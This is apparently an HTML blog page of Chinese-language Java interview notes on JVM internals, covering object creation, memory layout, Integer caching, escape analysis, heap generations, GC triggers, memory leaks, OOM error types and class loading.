<h1 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h1><h2 id="1、虚拟机中对象的创建过程"><a href="#1、虚拟机中对象的创建过程" class="headerlink" title="1、虚拟机中对象的创建过程"></a>1、虚拟机中对象的创建过程</h2><p><img src="https://qiniu.xiaoming.net.cn/java%E5%88%9B%E5%BB%BA%E5%AF%B9%E8%B1%A1%E7%9A%84%E8%BF%87%E7%A8%8B.png" alt="java创建对象的过程"></p>
<h3 id="类加载检查"><a href="#类加载检查" class="headerlink" title="类加载检查"></a>类加载检查</h3><p>虚拟机遇到一条<code>new</code>指令时，首先将去检查这个指令的参数是否能在常量池中定位到这个类的符号引用，并且检查这个符号引用代表的类是否已经被加载过、解析和初始化过。如果没有，那必须先执行相应的类加载过程。</p>
<h3 id="分配内存"><a href="#分配内存" class="headerlink" title="分配内存"></a>分配内存</h3><p>在<strong>类加载检查</strong>通过后，接下来虚拟机将为新生对象<strong>分配内存</strong>。对象所需的内存大小在类加载完成后便可以确定，为对象分配空间的任务等同于把一块确定大小的内存从Java堆中划分出来。<strong>分配方式</strong>有 <strong>“指针碰撞”</strong> 和 <strong>“空闲列表”</strong> 两种，<strong>选择哪种分配方式由Java堆是否规整决定，而Java堆是否规整又由所采用的垃圾收集器是否带有压缩整理功能决定</strong>。</p>
<h4 id="内存分配的两种方式："><a href="#内存分配的两种方式：" class="headerlink" title="内存分配的两种方式："></a>内存分配的两种方式：</h4><p>选择以上两种方式中的哪一种，取决于 Java 堆内存是否规整。而 Java 堆内存是否规整，取决于 GC 收集器的算法是 <strong>“标记-清除”</strong>，还是 <strong>“标记-整理”</strong>（也称作 <strong>“标记-压缩”</strong>），值得注意的是，复制算法内存也是规整的。</p>
<p><img src="https://qiniu.xiaoming.net.cn/%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D%E7%9A%84%E4%B8%A4%E7%A7%8D%E6%96%B9%E5%BC%8F.png" alt="内存分配的两种方式"></p>
<h4 id="内存分配并发问题"><a href="#内存分配并发问题" class="headerlink" title="内存分配并发问题"></a>内存分配并发问题</h4><p>在创建对象的时候有一个很重要的问题，就是线程安全，因为在实际开发过程中，创建对象是很频繁的事情，作为虚拟机来说，必须要保证线程是安全的，通常来讲，虚拟机采用两种方式来保证线程安全：</p>
<ul>
<li><strong>CAS+失败重试</strong>：CAS 是乐观锁的一种实现方式。所谓乐观锁就是，每次不加锁而是假设没有冲突而去完成某项操作，如果因为冲突失败就重试，直到成功为止。虚拟机采用 CAS 配上失败重试的方式保证更新操作的原子性。</li>
<li><strong>TLAB</strong>：为每一个线程预先在Eden分配一块儿内存，JVM在给线程中的对象分配内存时，首先在TLAB分配，当对象大于TLAB中的剩余内存或TLAB的内存已经用尽时，再采用上述的CAS进行内存分配。</li>
</ul>
<h3 id="初始化零值"><a href="#初始化零值" class="headerlink" title="初始化零值"></a>初始化零值</h3><p>内存分配完成后，虚拟机需要将分配到的内存空间都初始化为零值（不包括对象头），这一步操作保证了对象的实例字段在Java代码中可以不赋初始值就直接使用，程序能访问到这些字段的数据类型所对应的零值。</p>
<h3 id="设置对象头"><a href="#设置对象头" class="headerlink" title="设置对象头"></a>设置对象头</h3><p>初始化零值完成后，<strong>虚拟机要对对象进行必要的设置</strong>，例如这个对象是哪个类的实例、如何才能找到类的元数据信息、对象的哈希码、对象的GC分代年龄等信息。<strong>这下信息存放在对象头中</strong>。另外，根据虚拟机当前运行状态的不同，如是否启动偏向锁等（<code>tag bits</code>信息），对象头会有不同的设置方式。</p>
<h3 id="执行init方法"><a href="#执行init方法" class="headerlink" title="执行init方法"></a>执行init方法</h3><p>在上面的工作都完成之后，从虚拟机的视角来看，一个新的对象已经产生了，但从Java程序的视角来看，对象创建才刚开始，<code>init</code>方法还没有执行，所有的字段都还为零。所以一般来说，执行<code>new</code>指令之后会接着执行<code>init</code>方法，把对象按照程序员的意愿进行初始化，这样一个真正可用的对象才算完全产生出来。</p>
<h2 id="2、对象的内存布局"><a href="#2、对象的内存布局" class="headerlink" title="2、对象的内存布局"></a>2、对象的内存布局</h2><p>在Hotspot虚拟机中，对象在内存中的布局可以分为3块区域：<strong>对象头、实例数据、对齐填充</strong>。</p>
<p><strong>Hotspot虚拟机的对象头包括两部分信息，第一部分用于存储对象自身的自身运行数据（哈希码、GC分代年龄、锁状态、标志等等）</strong>，另一部分是<strong>类型指针</strong>，即对象指向它的类元数据的指针，虚拟机通过这个指针来确定对象是哪个类的实例。</p>
<p><strong>实例数据部分是对象真正存储的有效信息，也就是在程序中所定义的各种类型的字段内容</strong>。</p>
<p><strong>对齐填充部分不是必然存在的，也没有什么特别的含义，仅仅是起占位作用</strong>。因为 Hotspot 虚拟机的自动内存管理系统要求对象起始地址必须是 8 字节的整数倍，换句话说就是对象的大小必须是 8 字节的整数倍。而对象头部分正好是 8 字节的倍数（1 倍或 2 倍），因此，当对象实例数据部分没有对齐时，就需要通过对齐填充来补全。</p>
<h2 id="3、对象的访问定位"><a href="#3、对象的访问定位" class="headerlink" title="3、对象的访问定位"></a>3、对象的访问定位</h2><p>建立对象就是为了访问对象，Java程序通过栈上得到<code>reference</code>数据来操作堆上的具体对象。对象的访问方式由虚拟机实现而定，目前主流的访问方式由<strong>使用句柄</strong>和<strong>直接指针</strong>两种：</p>
<ul>
<li>句柄：如果使用句柄的话，那么Java对堆中会划分出一块内存来作为<strong>句柄池</strong>，<code>reference</code>中存储的就是对象的句柄地址，而句柄中包含了对象实例数据与类型数据各自具体地址信息。</li>
</ul>
<p><img src="https://qiniu.xiaoming.net.cn/%E9%80%9A%E8%BF%87%E5%8F%A5%E6%9F%84%E8%AE%BF%E9%97%AE%E5%AF%B9%E8%B1%A1.png" alt="通过句柄访问对象"></p>
<ul>
<li>直接指针：如果使用直接指针访问，那么Java堆对象的布局中就必须考虑如何放置访问类型数据的相关信息，而<code>reference</code>中存储的直接就是对象的地址。</li>
</ul>
<p><img src="http://qiniu.xiaoming.net.cn/%E5%AF%B9%E8%B1%A1%E7%9A%84%E8%AE%BF%E9%97%AE%E5%AE%9A%E4%BD%8D-%E7%9B%B4%E6%8E%A5%E6%8C%87%E9%92%88.png" alt="通过指针直接访问对象"></p>
<p>这两种对象访问方式各有优势。使用句柄来访问的最大好处是<code>reference</code>中存储的是稳定的句柄地址，在对象被移动时只会改变句柄中的实例数据指针，而<code>reference</code>本身不需要修改。使用直接指针访问方式最大的好处就是速度快，它节省了一次指针定位的时间开销。</p>
<h2 id="4、8种基本类型的包装类和常量池"><a href="#4、8种基本类型的包装类和常量池" class="headerlink" title="4、8种基本类型的包装类和常量池"></a>4、8种基本类型的包装类和常量池</h2><p>Java基本类型的包装类的大部分都实现了常量池技术，即Byte、Short、Integer、Long、Character、Boolean；这5种包装类默认创建了数值[-128,127]的相应类型的缓存数据，但是超出此范围仍然会去创建新的对象。</p>
<blockquote>
<p>两种浮点型的包装类Float，Double并没有实现常量池技术</p>
</blockquote>
<h3 id="Integer缓存源码"><a href="#Integer缓存源码" class="headerlink" title="Integer缓存源码"></a>Integer缓存源码</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">*此方法将始终缓存-128 到 127（包括端点）范围内的值，并可以缓存此范围之外的其他值。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Integer <span class="title">valueOf</span><span class="params">(<span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (i &gt;= IntegerCache.low &amp;&amp; i &lt;= IntegerCache.high)</span><br><span class="line">            <span class="keyword">return</span> IntegerCache.cache[i + (-IntegerCache.low)];</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Integer(i);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Integer i1 = <span class="number">40</span>;    <span class="comment">//Java在编译的时候会直接将代码封装成Integer i1 = Integer.valueOf(40);从而使用常量池中的对象</span></span><br><span class="line"></span><br><span class="line">Integer i2 = <span class="keyword">new</span> Integer(<span class="number">40</span>);   <span class="comment">//这种情况下会创建新对象</span></span><br></pre></td></tr></table></figure>

<h3 id="Integer比较例子"><a href="#Integer比较例子" class="headerlink" title="Integer比较例子"></a>Integer比较例子</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Integer i1 = <span class="number">40</span>;</span><br><span class="line">Integer i2 = <span class="number">40</span>;</span><br><span class="line">Integer i3 = <span class="number">0</span>;</span><br><span class="line">Integer i4 = <span class="keyword">new</span> Integer(<span class="number">40</span>);</span><br><span class="line">Integer i5 = <span class="keyword">new</span> Integer(<span class="number">40</span>);</span><br><span class="line">Integer i6 = <span class="keyword">new</span> Integer(<span class="number">0</span>);</span><br><span class="line">  </span><br><span class="line">System.out.println(<span class="string">&quot;i1=i2   &quot;</span> + (i1 == i2));    <span class="comment">//true</span></span><br><span class="line">System.out.println(<span class="string">&quot;i1=i2+i3   &quot;</span> + (i1 == i2 + i3));    <span class="comment">//true</span></span><br><span class="line">System.out.println(<span class="string">&quot;i1=i4   &quot;</span> + (i1 == i4));    <span class="comment">//false</span></span><br><span class="line">System.out.println(<span class="string">&quot;i4=i5   &quot;</span> + (i4 == i5));    <span class="comment">//false</span></span><br><span class="line">System.out.println(<span class="string">&quot;i4=i5+i6   &quot;</span> + (i4 == i5 + i6));    <span class="comment">//true</span></span><br><span class="line">System.out.println(<span class="string">&quot;40=i5+i6   &quot;</span> + (<span class="number">40</span> == i5 + i6));    <span class="comment">//true</span></span><br></pre></td></tr></table></figure>

<p>语句<code>i4 == i5 + i6</code>，因为<code>+</code>这个操作符不适用于<code>Integer</code>对象，首先<code>i5</code>和<code>i6</code>进行自动拆箱操作，进行数值相加，即<code>i4 == 40</code>。然后<code>Integer</code>对象无法与数值进行直接比较，所以<code>i4</code>自动拆箱转为<code>int</code>值40，最终这条语句转为<code>40 == 40</code>进行数值比较。</p>
<h2 id="5、Java-对象一定在堆内存分配吗？"><a href="#5、Java-对象一定在堆内存分配吗？" class="headerlink" title="5、Java 对象一定在堆内存分配吗？"></a>5、Java 对象一定在堆内存分配吗？</h2><p>不一定，随着 JIT 编译器的发展，在编译期间，如果 JIT 经过逃逸分析，发现有些对象没有逃逸出方法，那么有可能堆内存分配会被优化为栈内存分配。但这并不是绝对的。</p>
<blockquote>
<p>JIT:在Java编程语言和环境中，即时编译器（JIT compiler，just-in-time compiler）是一个把Java的字节码（包括需要被解释的指令的程序）转换成可以直接发送给处理器的指令的程序。</p>
</blockquote>
<blockquote>
<p>逃逸分析（Escape Analysis）：目前Java虚拟机中比较前沿的优化技术。这是一种可以有效减少 Java 程序中同步负载和内存堆分配压力的跨函数全局数据流分析算法。通过逃逸分析，Java Hotspot编译器能够分析出一个新的对象的引用的使用范围从而决定是否要将这个对象分配到堆上。</p>
</blockquote>
<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>逃逸分析的基本行为就是分析对象动态作用域：当一个对象在方法中被定义后，它可能被外部方法所引用，例如作为调用参数传递到其他地方中，称为方法逃逸。</p>
<p>例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public static StringBuffer craeteStringBuffer(String s1, String s2) &#123;</span><br><span class="line">   StringBuffer sb &#x3D; new StringBuffer();</span><br><span class="line">   sb.append(s1);</span><br><span class="line">   sb.append(s2);</span><br><span class="line">   return sb;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>StringBuffer <code>sb</code> 是一个方法内部变量，上述代码中直接将 <code>sb</code> 返回，这样这个 StringBuffer 有可能被其他方法所改变，这样它的作用域就不只是在方法内部，虽然它是一个局部变量，称其逃逸到了方法外部。甚至还有可能被外部线程访问到，譬如赋值给类变量或可以在其他线程中访问的实例变量，称为线程逃逸。</p>
<p>上述代码如果想要 StringBuffer <code>sb</code> 不逃出方法，可以这样写：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public static String createStringBuffer(String s1, String s2) &#123;</span><br><span class="line">   StringBuffer sb &#x3D; new StringBuffer();</span><br><span class="line">   sb.append(s1);</span><br><span class="line">   sb.append(s2);</span><br><span class="line">   return sb.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>不直接返回 StringBuffer，那么 StringBuffer 将不会逃逸出方法。</p>
<p>使用逃逸分析，编译器可以对代码做如下优化：</p>
<ol>
<li>同步省略。如果一个对象被发现只能从一个线程被访问到，那么对于这个对象的操作可以不考虑同步。（<strong>锁优化中的锁消除</strong>）</li>
<li>将堆分配转化为栈分配。如果一个对象在子程序中被分配，要使指向该对象的指针永远不会逃逸，对象可能是栈分配的候选，而不是堆分配。</li>
<li>分离对象或标量替换。有的对象可能不需要作为一个连续的内存结构存在也可以被访问到，那么对象的部分（或全部）可以不存储在内存，而是存储在CPU寄存器中。</li>
</ol>
<p>在 Java 代码运行时，通过 JVM 参数可指定是否开启逃逸分析，</p>
<ul>
<li>-XX:+DoEscapeAnalysis ： 表示开启逃逸分析</li>
<li>-XX:-DoEscapeAnalysis ： 表示关闭逃逸分析</li>
</ul>
<p>从 jdk1.7 开始，默认是开启逃逸分析的</p>
<p>在一般情况下，对象和数组元素的内存分配是在堆内存上进行的。但是随着 JIT 编译器的日渐成熟，很多优化使这种分配策略并不绝对。JIT 编译器就可以在编译期间根据逃逸分析的结果，来决定是否可以将对象的内存分配从堆转化为栈。</p>
<h1 id="内存"><a href="#内存" class="headerlink" title="内存"></a>内存</h1><h2 id="1、内存是如何分配和回收的"><a href="#1、内存是如何分配和回收的" class="headerlink" title="1、内存是如何分配和回收的"></a>1、内存是如何分配和回收的</h2><p>Java的自动内存管理主要是针对对象内存的回收和对象内存的分配。同时，Java自动内存管理最核心的功能是<strong>堆内存中对象的分配与回收</strong>。</p>
<p>Java堆是垃圾收集器管理的主要区域，因此也被称为<strong>GC堆</strong>（Garbage Collected Heap）。从垃圾回收的角度，由于现在收集器基本都采用分代垃圾收集算法，所以Java堆还可以细分为：<strong>新生代和老年代</strong>，在细致一点有：<strong>Eden空间</strong>、<strong>From Survivor</strong>、<strong>To Survivor</strong>空间等。进一步划分是为了更好的回收内存，或者更快地分配内存。</p>
<p><strong>堆空间的基本结构</strong>：</p>
<p><img src="https://qiniu.xiaoming.net.cn/%E5%A0%86%E7%A9%BA%E9%97%B4%E7%9A%84%E5%9F%BA%E6%9C%AC%E7%BB%93%E6%9E%84.png" alt="堆空间的基本结构"></p>
<p>上图所示的<code>eden</code>区，<code>s0(&quot;From&quot;)</code>区，<code>s1(&quot;To&quot;)</code>区都属于新生代，<code>tentired</code>区属于老年代。大部分情况，对象都会首先在<code>Eden</code>区分配，在一次新生代垃圾回收后，如果对象还存活，则会进入<code>s1(&quot;To&quot;)</code>，并且对象的年龄还有加1（首次进入<code>Survivor</code>后年龄初始化为1），当它的年龄增加到一定程度（默认为15岁），就会被晋升到老年代中。对象晋升到老年代的年龄阈值，可以通过参数<code>-XX:MaxTenuringThreshold</code>来设置。经过这次GC后，<code>Eden</code>区和<code>From</code>区已经被清空。这个时候，<code>From</code>和<code>To</code>会交换它们的角色，也就是新的<code>To</code>就是上次GC前的<code>From</code>，新的<code>From</code>就是上次GC前的<code>To</code>。不管怎样，都会保证名为<code>To</code>的<code>Survivor</code>区域是空的。<code>Minor GC</code>会一直重复这样的过程，直到<code>To</code>区被填满，<code>To</code>区被填满之后，会将所有对象移动到年老代中。</p>
<p><img src="https://qiniu.xiaoming.net.cn/%E5%A0%86%E5%86%85%E5%AD%98%E5%B8%B8%E8%A7%81%E5%88%86%E9%85%8D%E7%AD%96%E7%95%A5.jpeg" alt="堆内存常见分配策略"></p>
<h3 id="对象优先在eden区分配"><a href="#对象优先在eden区分配" class="headerlink" title="对象优先在eden区分配"></a>对象优先在eden区分配</h3><p>目前主流的垃圾收集器都会采用分代回收算法，因此需要将堆内存分为新生代和老年代，这样我们就可以根据各个年代的特点选择合适的垃圾收集算法。</p>
<p>大多数情况下，对象在新生代中<code>eden</code>区分配。当<code>eden</code>区没有足够空间进行分配时，虚拟机将发起一次<code>Minor GC</code>.</p>
<blockquote>
<p>Minor GC 和 Full GC 有什么不同呢？</p>
<ul>
<li>新生代 GC（Minor GC）:指发生新生代的的垃圾收集动作，Minor GC 非常频繁，回收速度一般也比较快。</li>
<li>老年代 GC（Major GC/Full GC）:指发生在老年代的 GC，出现了 Major GC 经常会伴随至少一次的 Minor GC（并非绝对），Major GC 的速度一般会比 Minor GC 的慢 10 倍以上。</li>
</ul>
</blockquote>
<p><strong>分配担保机制</strong>：当<code>Eden</code>区被分配满了之后，有新的对象需要分配内存，此时虚拟机将发起一次<code>Minor Gc</code>,由于<code>Eden</code>中的对象还有用，所以不被回收，当时其对象所占内存比较大，GC期间无法存入<code>Survivor</code>空间，此时就会使用分配担保机制，将新生代的对象转移到老年代中去，如果老年代的空间足够，则不会发起<code>Full GC</code>。后面分配的对象如果能够存在<code>eden</code>区的话，还是会在<code>eden</code>区分配内存。</p>
<h3 id="大对象直接进入老年代"><a href="#大对象直接进入老年代" class="headerlink" title="大对象直接进入老年代"></a>大对象直接进入老年代</h3><p>大对象就是需要大量连续内存空间的对象（比如：字符串、数组）。</p>
<p>经常出现大对象会提前触发垃圾收集以获取足够的连续空间分配给大对象。</p>
<ul>
<li><code>XX:PretenureSizeThreshold</code>，大于此值的对象直接在老年代分配，避免在 Eden 和 Survivor 之间的大量内存复制。</li>
</ul>
<p><strong>原因</strong>：为了避免为大对象分配内存时由于分配担保机制带来的复制而降低效率。</p>
<h3 id="长期存活的对象将进入老年期"><a href="#长期存活的对象将进入老年期" class="headerlink" title="长期存活的对象将进入老年期"></a>长期存活的对象将进入老年期</h3><p>既然虚拟机采用了分代收集的思想来管理内存，那么内存回收时就必须能识别哪些对象应放在新生代，哪些对象应放在老年代中。为了做到这一点，虚拟机给每个对象一个对象年龄（<code>Age</code>）计数器。</p>
<p>如果对象在<code>eden</code>出生并经过第一次<code>Minor Gc</code>后仍然能够存活，并且能被<code>Survivor</code>容纳的话，将被移动到<code>Survivor</code>空间中，并将对象年龄设为1。对象在<code>Survivor</code>中每熬过一次<code>Minor Gc</code>,年龄就增加1岁，当它的年龄增加到一定程度（默认为15），就会晋升到老年代中。对象晋升到老年代的年龄阈值，可以通过参数<code>-XX:MaxTenuringThreshold</code>来设置。</p>
<h3 id="动态对象年龄判断"><a href="#动态对象年龄判断" class="headerlink" title="动态对象年龄判断"></a>动态对象年龄判断</h3><p>为了更好的适应不同程序的内存情况，虚拟机不是永远要求对象年龄必须达到了某个值才进入老年代。如果<code>Survivor</code>空间中所有年龄相同的对象大小总和大于<code>Survivor</code>空间的一半，年龄大于或等于该年龄的对象就可以直接进入老年代，无需达到要求的年龄。</p>
<h2 id="2、Full-GC的触发条件"><a href="#2、Full-GC的触发条件" class="headerlink" title="2、Full GC的触发条件"></a>2、Full GC的触发条件</h2><p>对于<code>Minor GC</code>，其触发条件非常简单，当<code>Eden</code>空间满了之后，就将出发一次<code>Minor GC</code>,而<code>Full GC</code>则相对复杂，需要有以下条件：</p>
<ul>
<li><strong>调用<code>System.gc()</code></strong>:只是建议虚拟机执行<code>Full GC</code>,但是虚拟机不一定真正去执行。不建议使用这种方式，而是让虚拟机管理内存。</li>
<li><strong>老年代空间不足</strong>：老年代空间不足的常见场景为前文所讲的大对象直接进入老年代、长期存活的对象进入老年代等。<br>为了避免以上原因引起的 Full GC，应当尽量不要创建过大的对象以及数组。除此之外，可以通过<code>-Xmn</code>虚拟机参数调大新生代的大小，让对象尽量在新生代被回收掉，不进入老年代。还可以通过<code>-XX:MaxTenuringThreshold</code>调大对象进入老年代的年龄，让对象在新生代多存活一段时间。</li>
<li><strong>空间分配担保失败</strong>：使用复制算法的<code>Minor GC</code>需要老年代的内存空间作担保，如果担保失败会执行一个<code>Full GC</code></li>
<li><strong>JDK1.7以及以前的永久代空间不足</strong>：在 JDK 1.7 及以前，HotSpot 虚拟机中的方法区是用永久代实现的，永久代中存放的为一些<code>Class</code>的信息、常量、静态变量等数据。<br>当系统中要加载的类、反射的类和调用的方法较多时，永久代可能会被占满，在未配置为采用<code>CMS GC</code>的情况下也会执行<code>Full GC</code>。如果经过<code>Full GC</code>仍然回收不了，那么虚拟机会抛出<code>java.lang.OutOfMemoryError</code>。<br>为避免以上原因引起的<code>Full GC</code>，可采用的方法为增大永久代空间或转为使用<code>CMS GC</code>。</li>
<li><strong>Concurrent Mode Failure</strong>:执行<code>CMS GC</code>的过程中同时有对象要放入老年代，而此时老年代空间不足（可能是<code>GC</code>过程中浮动垃圾过多导致短暂性的空间不足，便会报<code>Concurrent Mode Failure</code>，并触发<code>Full GC</code>。</li>
</ul>
<h2 id="3、Java中会存在内存泄漏吗？请简单描述"><a href="#3、Java中会存在内存泄漏吗？请简单描述" class="headerlink" title="3、Java中会存在内存泄漏吗？请简单描述"></a>3、Java中会存在内存泄漏吗？请简单描述</h2><p>内存泄露就是指一个不再被程序使用的对象或变量一直被占据在内存中。java 中有垃圾回收机制，它可以保证一对象不再被引用的时候，即对象变成了孤儿的时候，对象将自动被垃圾回收器从内存中清除掉。由于 Java 使用有向图的方式进行垃圾回收管理，可以消除引用循环的问题，例如有两个对象，相互引用，只要它们和根进程不可达的，那么GC也是可以回收它们的</p>
<p>java中的内存泄露的情况：</p>
<ol>
<li><strong>长生命周期的对象持有短生命周期对象的引用就很可能发生内存泄露</strong>，尽管短生命周期对象已经不再需要，但是因为长生命周期对象持有它的引用而导致不能被回收，这就是 java 中内存泄露的发生场景，通俗地说，就是程序员可能创建了一个对象，以后一直不再使用这个对象，这个对象却一直被引用，即这个对象无用但是却无法被垃圾回收器回收的，这就是 java 中可能出现内存泄露的情况，例如，缓存系统，我们加载了一个对象放在缓存中(例如放在一个全局map对象中)，然后一直不再使用它，这个对象一直被缓存引用，但却不再被使用。<br>检查 java 中的内存泄露，一定要让程序将各种分支情况都完整执行到程序结束，然后看某个对象是否被使用过，如果没有，则才能判定这个对象属于内存泄露。</li>
<li>如果一个外部类的实例对象的方法返回了一个内部类的实例对象，这个内部类对象被长期引用了，即使那个外部类实例对象不再被使用，但由于内部类持久外部类的实例对象，这个外部类对象将不会被垃圾回收，这也会造成内存泄露。</li>
<li>当一个对象被存储进 HashSet 集合中以后，就不能修改这个对象中的那些参与计算哈希值的字段了，否则，对象修改后的哈希值与最初存储进 HashSet 集合中时的哈希值就不同了，在这种情况下，即使在 <code>contains</code> 方法使用该对象的当前引用作为的参数去HashSet集合中检索对象，也将返回找不到对象的结果，这也会导致无法从 HashSet 集合中单独删除当前对象，造成内存泄露。</li>
</ol>
<h2 id="4、JVM-在哪些情况下会抛出-OOM-异常"><a href="#4、JVM-在哪些情况下会抛出-OOM-异常" class="headerlink" title="4、JVM 在哪些情况下会抛出 OOM 异常"></a>4、JVM 在哪些情况下会抛出 OOM 异常</h2><p>OOM 可能出现的消息有：</p>
<ul>
<li>java.lang.OutOfMemoryError: Java heap space</li>
<li>java.lang.OutOfMemoryError: PermGen space</li>
<li>java.lang.OutOfMemoryError: Metaspace</li>
<li>java.lang.OutOfMemoryError: Requested array size exceeds VM limit</li>
<li>java.lang.OutOfMemoryError: request bytes for . Out of swap space?</li>
<li>java.lang.OutOfMemoryError: (Native method)</li>
</ul>
<h3 id="Java-堆溢出（Java-heap-space）"><a href="#Java-堆溢出（Java-heap-space）" class="headerlink" title="Java 堆溢出（Java heap space）"></a>Java 堆溢出（Java heap space）</h3><p>java 堆用于存储对象实例，只要不断地创建对象，并且这些对象不会被回收（什么情况对象不会被回收呢？如：由于 GC Root 到对象之间有可达路径，所以垃圾回收机制不会清除这些对象），那么，当对象的数量达到一定的数量，从而达到了最大堆容量（-Xmx）限制了，这个时候会产生内存溢出异常。</p>
<p>java堆内存溢出异常的堆栈信息：<code>java.lang.OutOfMemoryError：java heap space</code></p>
<p><strong>解决方法</strong>：</p>
<p>首先要确认内存中的对象是否是必要的，也就是要区分出现的是内存泄露（Memory Leak）还是内存溢出（Memory Overflow）</p>
<p>如果是内存泄露，要使用工具查看泄露对象到 GC Roots 的引用链，找到泄露对象是通过怎样的路径与 GC Roots 相关联并导致垃圾收集器无法自动回收它们。</p>
<p>如果不是内存泄露，那么就要检查JVM参数（-Xmx与-Xms），根据机器物理内存情况看看是否能把参数调大一些，另一方面，从代码层面考虑，看看是否存在某些对象生命周期过长、持有状态时间过长的情况，优化代码，从而尝试减少程序在运行期的内存消耗。</p>
<h3 id="方法区（永久代）已满（PermGen-space）"><a href="#方法区（永久代）已满（PermGen-space）" class="headerlink" title="方法区（永久代）已满（PermGen space）"></a>方法区（永久代）已满（PermGen space）</h3><p>此错误，为内存溢出错误。更具体的说，是指方法区（永久代）内存溢出，表明永久代已满。永久代是存储类和方法对象的堆的区域。</p>
<p><strong>解决方案</strong>：</p>
<p>在JDK1.6及之前的版本中，常量池分配在永久带内，可以通过 <code>-XX:PermSize</code> 和 <code>-XX:MaxPermSize</code> 限制方法区的大小，从而间接来限制常量池的大小。</p>
<h3 id="Metaspace内存溢出"><a href="#Metaspace内存溢出" class="headerlink" title="Metaspace内存溢出"></a>Metaspace内存溢出</h3><p>元空间的溢出，系统会抛出 <code>java.lang.OutOfMemoryError: Metaspace</code>。出现这个异常的问题的原因是系统的代码非常多或引用的第三方包非常多或者通过动态代码生成类加载等方法，导致元空间的内存占用很大。</p>
<p><strong>解决方案</strong>：</p>
<p>默认情况下，元空间的大小仅受本地内存限制。但是为了整机的性能，尽量还是要对该项进行设置，以免造成整机的服务停机。</p>
<ol>
<li>优化参数配置，避免影响其他JVM进程</li>
</ol>
<ul>
<li><code>-XX:MetaspaceSize</code>，初始空间大小，达到该值就会触发垃圾收集进行类型卸载，同时 GC 会对该值进行调整：如果释放了大量的空间，就适当降低该值；如果释放了很少的空间，那么在不超过 <code>MaxMetaspaceSize</code> 时，适当提高该值。</li>
<li><code>-XX:MaxMetaspaceSize</code>，最大空间，默认是没有限制的。</li>
</ul>
<p>除了上面两个指定大小的选项以外，还有两个与 GC 相关的属性：</p>
<ul>
<li><code>-XX:MinMetaspaceFreeRatio</code>，在 GC 之后，最小的 Metaspace 剩余空间容量的百分比，减少为分配空间所导致的垃圾收集 。</li>
<li><code>-XX:MaxMetaspaceFreeRatio</code>，在 GC 之后，最大的 Metaspace 剩余空间容量的百分比，减少为释放空间所导致的垃圾收集。</li>
</ul>
<ol>
<li>慎重引用第三方包</li>
</ol>
<p>对第三方包，一定要慎重选择，不需要的包就去掉。这样既有助于提高编译打包的速度，也有助于提高远程部署的速度。</p>
<ol>
<li>关注动态生成类的框架</li>
</ol>
<p>对于使用大量动态生成类的框架，要做好压力测试，验证动态生成的类是否超出内存的需求会抛出异常。</p>
<h3 id="数组超限内存溢出（Requested-array-size-exceeds-VM-limit）"><a href="#数组超限内存溢出（Requested-array-size-exceeds-VM-limit）" class="headerlink" title="数组超限内存溢出（Requested array size exceeds VM limit）"></a>数组超限内存溢出（Requested array size exceeds VM limit）</h3><p>此错误表示应用程序（或该应用程序使用的API）尝试分配大于堆大小的数组。例如，如果应用程序尝试分配512MB 的数组但最大堆大小为 256MB，则将抛出此错误消息的 OOM。在大多数情况下，是配置问题或应用程序尝试分配海量数组时导致的错误。</p>
<h3 id="超出交换区内存溢出（request-bytes-for-Out-of-swap-space）"><a href="#超出交换区内存溢出（request-bytes-for-Out-of-swap-space）" class="headerlink" title="超出交换区内存溢出（request bytes for . Out of swap space）"></a>超出交换区内存溢出（request bytes for . Out of swap space）</h3><p>在Java应用程序启动过程中，可以通过 <code>-Xmx</code> 和其他类似的启动参数限制指定的所需的内存。而当 JVM 所请求的总内存大于可用物理内存的情况下，操作系统开始将内容从内存转换为硬盘。</p>
<p>当本机堆的分配失败并且本机堆可能将被耗尽时，HotSpot VM 会抛出此异常。消息中包括失败请求的大小（以字节为单位）以及内存请求的原因。在大多数情况下，是报告分配失败的源模块的名称。</p>
<p>如果抛出此类型的OOM，则可能需要在操作系统上使用故障排除实用程序来进一步诊断问题。在某些情况下，问题甚至可能与应用程序无关。例如，可能会在以下情况下看到此错误：</p>
<ul>
<li>操作系统配置的交换空间不足。</li>
<li>系统上的另一个进程是消耗所有可用的内存资源。</li>
</ul>
<p>由于本机泄漏，应用程序也可能失败（例如，如果某些应用程序或库代码不断分配内存但无法将其释放到操作系统）。</p>
<h3 id="本地方法溢出内存溢出（Native-method）"><a href="#本地方法溢出内存溢出（Native-method）" class="headerlink" title="本地方法溢出内存溢出（Native method）"></a>本地方法溢出内存溢出（Native method）</h3><p>此错误消息并且堆栈跟踪的顶部框架是本机方法，则该本机方法遇到分配失败。此消息与上一个消息之间的区别在于，在 JNI 或本机方法中检测到 Java 内存分配失败，而不是在 Java VM 代码中检测到。</p>
<h2 id="5、怎么写一个栈溢出、OOM-的代码？"><a href="#5、怎么写一个栈溢出、OOM-的代码？" class="headerlink" title="5、怎么写一个栈溢出、OOM 的代码？"></a>5、怎么写一个栈溢出、OOM 的代码？</h2><p>栈溢出：循环递归调用<br>OOM：分配大数组</p>
<h1 id="类加载"><a href="#类加载" class="headerlink" title="类加载"></a>类加载</h1><h2 id="1、类加载过程"><a href="#1、类加载过程" class="headerlink" title="1、类加载过程"></a>1、类加载过程</h2><p>类加载过程就是将<code>class</code>文件加载进内存，系统加载<code>class</code>类型的文件主要分为三步：<strong>加载，连接，初始化</strong>，而连接过程又可以分为：<strong>验证，准备，解析</strong>三个过程。</p>
